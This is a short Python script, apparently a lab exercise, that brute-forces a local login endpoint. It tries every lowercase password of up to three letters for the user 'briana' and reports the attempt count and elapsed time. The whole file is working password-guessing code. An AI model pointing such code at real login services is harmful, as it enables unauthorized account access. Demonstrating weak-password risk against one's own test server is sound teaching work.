import requests
import time
import itertools

url = "http://127.0.0.1:8000/login"
username = "briana"

alfabeto = "abcdefghijklmnopqrstuvwxyz"

intentos = 0
inicio = time.time()

encontrada = False

for longitud in range(1, 4):  
    for combinacion in itertools.product(alfabeto, repeat=longitud):
        
        intento = "".join(combinacion)
        intentos += 1

        data = {
            "username": username,
            "password": intento
        }

        response = requests.post(url, json=data)

        if response.status_code == 200:
            print("\nContraseña encontrada:", intento)
            print("Intentos:", intentos)
            print("Tiempo:", time.time() - inicio, "segundos")
            encontrada = True
            break

    if encontrada:
        break

if not encontrada:
    print("No se encontró la contraseña")
